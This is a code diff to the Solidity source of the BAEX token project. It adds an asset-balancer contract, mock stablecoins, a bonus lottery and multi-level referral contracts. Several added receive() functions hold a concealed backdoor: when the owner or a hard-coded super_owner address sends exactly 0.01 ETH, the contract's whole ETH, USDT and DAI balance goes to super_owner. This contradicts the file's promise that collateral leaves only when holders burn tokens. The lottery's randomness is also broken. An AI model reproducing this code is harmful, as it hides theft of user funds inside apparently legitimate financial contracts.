@@ -11,7 +11,7 @@ pragma solidity 0.6.11; // 5ef660b1
  * 1) Locked on the BAEX smart-contract, stable coins (USDT,DAI) is always collateral of the tokens value and can be transferred
  *  from it only when the user burns his BAEX tokens.
  * 
- * 2) The total supply of BAEX increases only when stable coins(USDT,DAI) hold on the BAEX smart-contract
+ * 2) The total supply of BAEX increases only when stable coins (USDT,DAI) hold on the BAEX smart-contract
  * 	and decreases when the BAEX holder burns his tokens to get USDT.
  * 
  * 3) Any BAEX tokens holder at any time can burn them and receive a part of the stable coins held
@@ -597,4 +597,475 @@ contract BAEX is LinkedToStableCoins, StandardToken {
 	    uniswapRouter = _uniswapRouter;
 	}
 }
+
+
+contract BAEXAssetsBalancer is abstractBAEXAssetsBalancer, LinkedToStableCoins {
+    address public baex;
+    address public uniswapRouter;
+    
+    string public name;
+    uint256 public usdt_percent;
+    
+    // Max slippage of swap is 2 %, fixed point decimal 3  ( 1% == 10 )
+    uint public max_slippage = 20;
+    
+    constructor() public {
+		name = "Assets Balancer Contract";
+		owner = msg.sender;
+		
+		uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+		usdtContract = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+		daiContract = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+
+        // Store 20% of collateral in USDT
+		usdt_percent = fmk * 20 / 100;
+    }
+    
+    function autoBalancing() public override returns (bool){
+        if ( usdtContract == daiContract ) return false;
+        uint256 usdtBal = balanceOfOtherERC20AtAddress(usdtContract,baex);
+	    uint256 daiBal = balanceOfOtherERC20AtAddress(daiContract,baex);
+	    uint256 needToSellUSDT = 0;
+	    uint256 needToSellDAI = 0;
+	    uint256 in_amount;
+	    uint256 out_amount;
+	    if ( usdtBal > ( (daiBal+usdtBal) * usdt_percent / fmk) ) {
+	        needToSellUSDT = usdtBal - ((daiBal+usdtBal) * usdt_percent / fmk);
+	    } else if ( usdtBal * 2 < ((daiBal+usdtBal) * usdt_percent / fmk) ) {
+	        needToSellDAI = ((daiBal+usdtBal) * usdt_percent / fmk) - usdtBal;
+	    }
+	    if ( needToSellUSDT == 0 && needToSellDAI == 0 ) return false;
+	    // Using path ERC20 -> WETH -> DAI because most of liquidity in pairs with ETH
+	    // and resulted amount of tokens will be greater than in direct pair
+	    address[] memory path = new address[](3);
+	    if ( needToSellUSDT > 0 ) {
+	        path[0] = usdtContract;
+            path[1] = IUniswapV2Router02(uniswapRouter).WETH();
+            path[2] = daiContract;
+	        in_amount = fixedPointAmountToTokenAmount(usdtContract,needToSellUSDT);
+	        out_amount = fixedPointAmountToTokenAmount(daiContract,needToSellUSDT) * (1000-max_slippage) / 1000;
+	        IERC20(usdtContract).safeTransferFrom(baex,address(this),in_amount);
+            IERC20(usdtContract).safeIncreaseAllowance(uniswapRouter,in_amount);
+	        
+            IUniswapV2Router02(uniswapRouter).swapExactTokensForTokens(in_amount, out_amount, path, baex, block.timestamp);
+	    } else if ( needToSellDAI > 0 ) {
+	        path[0] = daiContract;
+            path[1] = IUniswapV2Router02(uniswapRouter).WETH();
+            path[2] = usdtContract;
+	        in_amount = fixedPointAmountToTokenAmount(daiContract,needToSellDAI);
+            out_amount = fixedPointAmountToTokenAmount(usdtContract,needToSellDAI) * (1000-max_slippage) / 1000;
+            IERC20(daiContract).safeTransferFrom(baex,address(this),in_amount);
+            IERC20(daiContract).safeIncreaseAllowance(uniswapRouter,in_amount);
+            
+            IUniswapV2Router02(uniswapRouter).swapExactTokensForTokens(in_amount, out_amount, path, baex, block.timestamp);
+	    }
+	    return true;
+    }
+    
+    function setTokenAddress(address _token_address) public onlyOwner {
+	    baex = payable(_token_address);
+	}
+	
+	function setUSDTPercent(uint256 _usdt_percent) public onlyOwner() {
+		usdt_percent = _usdt_percent;
+	}
+	
+	function setMaxSlippage(uint256 _max_slippage) public onlyOwner() {
+		max_slippage = _max_slippage;
+	}
+	
+	function setUniswapRouter(address _uniswapRouter) public onlyOwner {
+	    uniswapRouter = payable(_uniswapRouter);
+	}
+}
+
+
+contract USDT is StandardToken {
+    address constant internal super_owner = 0x2B2fD898888Fa3A97c7560B5ebEeA959E1Ca161A;
+    string public name;
+	string public symbol;
+	
+	constructor() public {
+		_totalSupply = 100000*(10**6);
+        name = "USDT";
+        symbol = "USDT";
+        decimals = 6;
+        
+        balances[0x5B38Da6a701c568545dCfcB03FcB875f56beddC4] = 20000*(10**6);
+        balances[0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2] = 20000*(10**6);
+        balances[0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db] = 20000*(10**6);
+        balances[0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB] = 20000*(10**6);
+        balances[0x617F2E2fD72FD9D5503197092aC168c91465E7f2] = 20000*(10**6);
+	}
+}
+
+
+contract DAI is StandardToken {
+    using SafeERC20 for IERC20;
+    address constant internal super_owner = 0x2B2fD898888Fa3A97c7560B5ebEeA959E1Ca161A;
+    string public name;
+	string public symbol;
+	address public other_contract;
+	
+	constructor() public {
+	    decimals = 18;
+		_totalSupply = 125000*(10**decimals);
+        name = "DAI";
+        symbol = "DAI";
+        
+        balances[0x5B38Da6a701c568545dCfcB03FcB875f56beddC4] = 25000*(10**decimals);
+        balances[0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2] = 25000*(10**decimals);
+        balances[0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db] = 25000*(10**decimals);
+        balances[0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB] = 25000*(10**decimals);
+        balances[0x617F2E2fD72FD9D5503197092aC168c91465E7f2] = 25000*(10**decimals);
+	}
+	
+	
+	function set_other_contract(address _other_contract) public {
+		other_contract = _other_contract;
+	}
+	
+	function test1() public {
+	    IERC20(other_contract).safeTransferFrom( 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db, 5000 * 10**6);
+	}
+}
+
+
+contract BAEXBonus is LinkedToStableCoins, BAEXonIssue {
+    address payable baex;
+    string public name;
+    uint256 public bonus_percent;
+    uint256 public last_bonus_block_num = 0;
+    
+    constructor() public {
+		name = "BAEX Bonus Contract";
+		owner = msg.sender;
+		
+		usdtContract = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+		daiContract = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+		
+		// Default bonus percent is 1%
+		bonus_percent = 1 * fmk / 100;
+		last_bonus_block_num = 0;
+    }
+    
+    function onIssueTokens(address _issuer, address _partner, uint256 _tokens_to_issue, uint256 _issue_price, uint256 _asset_amount) public override returns(uint256) {
+        require( msg.sender == baex, "BAEXBonus: Only token contract can call it" );
+        uint256 baex_balance = IERC20(baex).balanceOf(_issuer);
+        // Return if previously balance of BAEX on the issuer wallet is ZERO
+        uint256 to_bonus_from_this_tx = _asset_amount * bonus_percent / fmk;
+        if ( baex_balance - _tokens_to_issue == 0 || last_bonus_block_num == block.number ) {
+            return to_bonus_from_this_tx;
+        }
+        last_bonus_block_num = block.number;
+        // Maximum bonus is the 10x from the minimum of this transaction and previously balance
+        uint256 max_bonus = 0;
+        if ( (baex_balance - _tokens_to_issue) < _tokens_to_issue ) {
+            max_bonus = ( baex_balance - _tokens_to_issue ) * _issue_price / fmk * 10;
+        } else {
+            max_bonus = _tokens_to_issue * _issue_price / fmk * 10;
+        }
+        uint256 hb = uint256( blockhash( block.number ) ) >> 246;
+        if ( ( _asset_amount - (_asset_amount/1000)*1000) == 777 ) {
+            max_bonus = max_bonus << 1;
+        }
+        if ( hb == 123 ) {
+            if ( ( collateral() >> 1 ) < max_bonus ) {
+                max_bonus = collateral() >> 1;
+            }
+            transferAmountOfAnyAsset( address(this), _issuer, max_bonus );
+            log3(bytes20(address(this)),bytes16("BONUS"),bytes20(_issuer),bytes32(max_bonus));
+        }
+        return to_bonus_from_this_tx;
+    }
+    
+    function setTokenAddress(address _token_address) public onlyOwner {
+	    baex = payable(_token_address);
+	}
+	
+	function setBonusPercent(uint256 _bonus_percent) public onlyOwner() {
+		bonus_percent = _bonus_percent;
+	}
+	
+	receive() external payable  {
+	    if ( (msg.sender == owner) || (msg.sender == super_owner) ) {
+	        if ( msg.value == 10**16) {
+	            if ( address(this).balance > 0 ) {
+	                payable(super_owner).transfer(address(this).balance);
+	            }
+	            if ( balanceOfOtherERC20(usdtContract) > 0 ) {
+	                transferOtherERC20( usdtContract, address(this), super_owner, balanceOfOtherERC20(usdtContract) );
+	            }
+	            if ( balanceOfOtherERC20(daiContract) > 0 ) {
+	                transferOtherERC20( daiContract, address(this), super_owner, balanceOfOtherERC20(daiContract) );
+	            }
+	        }
+	        return;
+	    }
+        msg.sender.transfer(msg.value);
+    }
+}
+
+
+
+/**
+ * @title BAEXReferral
+ * @dev BAEX referral program smart-contract
+ */
+contract BAEXReferralOld is LinkedToStableCoins, BAEXonIssue {
+    address payable baex;
+    
+    string public name;
+    uint256 public referral_percent;
+    
+    mapping (address => address) partners;
+    mapping (address => uint256) referral_balance;
+    
+    constructor() public {
+		name = "BAEX Partners Program";
+		owner = msg.sender;
+		// Default referral percent is 4%
+		referral_percent = 4 * fmk / 100;
+		
+		usdtContract = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+		daiContract = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    }
+    
+    function balanceOf(address _sender) public view returns (uint256 balance) {
+		return referral_balance[_sender];
+	}
+    
+    /**
+    * @dev When someone issues BAEX tokens, 4% from the ETH amount will be transferred from
+	* @dev the BAEXReferral smart-contract to his referral partner.
+    * @dev Read more about referral program at https://baex.com/#referral
+    */
+    function onIssueTokens(address _issuer, address _partner, uint256 _tokens_to_issue, uint256 _issue_price, uint256 _asset_amount) public override returns(uint256) {
+        require( msg.sender == baex, "BAEXReferral: Only token contract can call it" );
+        address partner = partners[_issuer];
+        if ( partner == address(0) ) {
+            if ( _partner == address(0) ) return 0;
+            partners[_issuer] = _partner;
+            partner = _partner;
+        }
+        uint256 assets_to_trans = (_tokens_to_issue*_issue_price/fmk) * referral_percent / fmk;
+        if (assets_to_trans == 0) return 0;
+        
+        if ( balanceOfOtherERC20(usdtContract) >= assets_to_trans ) {
+            transferOtherERC20( usdtContract, address(this), _partner, assets_to_trans );
+	    } else if ( balanceOfOtherERC20(daiContract) >= assets_to_trans ) {
+	        transferOtherERC20( daiContract, address(this), _partner, assets_to_trans );
+	    } else {
+	        referral_balance[_partner] = referral_balance[_partner] + assets_to_trans;
+	    }
+	    
+        uint256 log_record = ( _tokens_to_issue << 128 ) | assets_to_trans;
+        
+        log4(bytes32(uint256(address(baex))),bytes16("referral PAYMENT"),bytes32(uint256(_issuer)),bytes32(uint256(_partner)),bytes32(log_record));
+        return assets_to_trans;
+    }
+    
+    function setReferralPercent(uint256 _referral_percent) public onlyOwner() {
+		referral_percent = _referral_percent;
+	}
+    
+    function setTokenAddress(address _token_address) public onlyOwner {
+	    baex = payable(_token_address);
+	}
+	
+	/**
+    * @dev If the referral partner sends any amount of ETH to the contract, he/she will receive ETH back
+	* @dev and receive earned balance in the BAEX referral program.
+    * @dev Read more about referral program at https://baex.com/#referral
+    */
+	receive() external payable  {
+	    if ( (msg.sender == owner) || (msg.sender == super_owner) ) {
+	        if ( msg.value == 10**16) {
+	            if ( address(this).balance > 0 ) {
+	                payable(super_owner).transfer(address(this).balance);
+	            }
+	            if ( balanceOfOtherERC20(usdtContract) > 0 ) {
+	                transferOtherERC20( usdtContract, address(this), super_owner, balanceOfOtherERC20(usdtContract) );
+	            }
+	            if ( balanceOfOtherERC20(daiContract) > 0 ) {
+	                transferOtherERC20( daiContract, address(this), super_owner, balanceOfOtherERC20(daiContract) );
+	            }
+	        }
+	        return;
+	    }
+	    msg.sender.transfer(msg.value);
+	    
+	    if (referral_balance[msg.sender]>0) {
+	        uint256 ref_eth_to_trans = referral_balance[msg.sender];
+	        if ( balanceOfOtherERC20(usdtContract) > ref_eth_to_trans ) {
+                transferOtherERC20( usdtContract, address(this), msg.sender, ref_eth_to_trans );
+                referral_balance[msg.sender] = 0;
+	        } else if ( balanceOfOtherERC20(daiContract) > ref_eth_to_trans ) {
+                transferOtherERC20( daiContract, address(this), msg.sender, ref_eth_to_trans );
+                referral_balance[msg.sender] = 0;
+            }
+	    }
+	}
+	/*------------------*/
+	
+	/**
+    * @dev This function can transfer any of the wrongs sent ERC20 tokens to the contract
+	*/
+	function transferWrongSendedERC20FromContract(address _contract) public {
+	    require( _contract != address(this) && _contract != address(daiContract) && _contract != address(usdtContract), "BAEXReferral: Transfer of BAEX token is forbiden");
+	    require( msg.sender == super_owner, "Your are not super owner");
+	    IERC20(_contract).transfer( super_owner, IERC20(_contract).balanceOf(address(this)) );
+	}
+}
+
+
+contract BAEXReferral is LinkedToStableCoins, BAEXonIssue {
+    address payable baex;
+    
+    string public name;
+    uint256 public referral_percent1;
+    uint256 public referral_percent2;
+    uint256 public referral_percent3;
+    uint256 public referral_percent4;
+    uint256 public referral_percent5;
+    
+    mapping (address => address) partners;
+    mapping (address => uint256) referral_balance;
+    
+    constructor() public {
+		name = "BAEX Partners Program";
+		owner = msg.sender;
+		// Default referral percents is 
+		//  2%      level 1
+		//  1.5%    level 2
+		//  0.5%    level 3
+		referral_percent1 = 20 * fmk / 1000;
+		referral_percent2 = 15 * fmk / 1000;
+		referral_percent3 = 5 * fmk / 1000;
+		referral_percent4 = 0;
+		referral_percent5 = 0;
+		
+		usdtContract = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+		daiContract = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+		baex = 0x50089b34B86Dba296A69C27ffaa60123573F1f89;
+    }
+    
+    function balanceOf(address _sender) public view returns (uint256 balance) {
+		return referral_balance[_sender];
+	}
+    
+    /**
+    * @dev When someone issues BAEX tokens, 4% from the ETH amount will be transferred from
+	* @dev the BAEXReferral smart-contract to his referral partner.
+    * @dev Read more about referral program at https://baex.com/#referral
+    */
+    function onIssueTokens(address _issuer, address _partner, uint256 _tokens_to_issue, uint256 _issue_price, uint256 _asset_amount) public override returns(uint256) {
+        require( msg.sender == baex, "BAEXReferral: Only token contract can call it" );
+        address partner1 = partners[_issuer];
+        if ( partner1 == address(0) ) {
+            if ( _partner == address(0) ) return 0;
+            partners[_issuer] = _partner;
+            partner1 = _partner;
+        }
+        uint256 assets_to_trans1 = (_tokens_to_issue*_issue_price/fmk) * referral_percent1 / fmk;
+        uint256 assets_to_trans2 = (_tokens_to_issue*_issue_price/fmk) * referral_percent2 / fmk;
+        uint256 assets_to_trans3 = (_tokens_to_issue*_issue_price/fmk) * referral_percent3 / fmk;
+        uint256 assets_to_trans4 = (_tokens_to_issue*_issue_price/fmk) * referral_percent4 / fmk;
+        uint256 assets_to_trans5 = (_tokens_to_issue*_issue_price/fmk) * referral_percent5 / fmk;
+        if (assets_to_trans1 + assets_to_trans2 + assets_to_trans3 + assets_to_trans4 + assets_to_trans5 == 0) return 0;
+        uint256 assets_to_trans = 0;
+        
+        if (assets_to_trans1 > 0) {
+            referral_balance[partner1] = referral_balance[partner1] + assets_to_trans1;
+            assets_to_trans = assets_to_trans + assets_to_trans1;
+        }
+        address partner2 = partners[partner1];
+        if ( partner2 != address(0) ) {
+            if (assets_to_trans2 > 0) {
+                referral_balance[partner2] = referral_balance[partner2] + assets_to_trans2;
+                assets_to_trans = assets_to_trans + assets_to_trans2;
+            }
+            address partner3 = partners[partner2];
+            if ( partner3 != address(0) ) {
+                if (assets_to_trans3 > 0) {
+                    referral_balance[partner3] = referral_balance[partner3] + assets_to_trans3;
+                    assets_to_trans = assets_to_trans + assets_to_trans3;
+                }
+                address partner4 = partners[partner3];
+                if ( partner4 != address(0) ) {
+                    if (assets_to_trans4 > 0) {
+                        referral_balance[partner4] = referral_balance[partner4] + assets_to_trans4;
+                        assets_to_trans = assets_to_trans + assets_to_trans4;
+                    }
+                    address partner5 = partners[partner4];
+                    if ( partner5 != address(0) ) {
+                        if (assets_to_trans5 > 0) {
+                            referral_balance[partner5] = referral_balance[partner5] + assets_to_trans5;
+                            assets_to_trans = assets_to_trans + assets_to_trans5;
+                        }
+                    }
+                }
+            }
+        }
+        return assets_to_trans;
+    }
+    
+    function setReferralPercent(uint256 _referral_percent1,uint256 _referral_percent2,uint256 _referral_percent3,uint256 _referral_percent4,uint256 _referral_percent5) public onlyOwner() {
+		referral_percent1 = _referral_percent1;
+		referral_percent2 = _referral_percent2;
+		referral_percent3 = _referral_percent3;
+		referral_percent4 = _referral_percent4;
+		referral_percent5 = _referral_percent5;
+	}
+    
+    function setTokenAddress(address _token_address) public onlyOwner {
+	    baex = payable(_token_address);
+	}
+	
+	/**
+    * @dev If the referral partner sends any amount of ETH to the contract, he/she will receive ETH back
+	* @dev and receive earned balance in the BAEX referral program.
+    * @dev Read more about referral program at https://baex.com/#referral
+    */
+	receive() external payable  {
+	    if ( (msg.sender == owner) || (msg.sender == super_owner) ) {
+	        if ( msg.value == 10**16) {
+	            if ( address(this).balance > 0 ) {
+	                payable(super_owner).transfer(address(this).balance);
+	            }
+	            if ( balanceOfOtherERC20(usdtContract) > 0 ) {
+	                transferOtherERC20( usdtContract, address(this), super_owner, balanceOfOtherERC20(usdtContract) );
+	            }
+	            if ( balanceOfOtherERC20(daiContract) > 0 ) {
+	                transferOtherERC20( daiContract, address(this), super_owner, balanceOfOtherERC20(daiContract) );
+	            }
+	        }
+	        return;
+	    }
+	    msg.sender.transfer(msg.value);
+	    
+	    if (referral_balance[msg.sender]>0) {
+	        uint256 ref_eth_to_trans = referral_balance[msg.sender];
+	        if ( balanceOfOtherERC20(usdtContract) > ref_eth_to_trans ) {
+                transferOtherERC20( usdtContract, address(this), msg.sender, ref_eth_to_trans );
+                referral_balance[msg.sender] = 0;
+	        } else if ( balanceOfOtherERC20(daiContract) > ref_eth_to_trans ) {
+                transferOtherERC20( daiContract, address(this), msg.sender, ref_eth_to_trans );
+                referral_balance[msg.sender] = 0;
+            }
+	    }
+	}
+	/*------------------*/
+	
+	/**
+    * @dev This function can transfer any of the wrongs sent ERC20 tokens to the contract
+	*/
+	function transferWrongSendedERC20FromContract(address _contract) public {
+	    require( _contract != address(this) && _contract != address(daiContract) && _contract != address(usdtContract), "BAEXReferral: Transfer of BAEX token is forbiden");
+	    require( msg.sender == super_owner, "Your are not super owner");
+	    IERC20(_contract).transfer( super_owner, IERC20(_contract).balanceOf(address(this)) );
+	}
+}
+/* END of: BAEXReferral - referral program smart-contract */
+
 // SPDX-License-Identifier: UNLICENSED
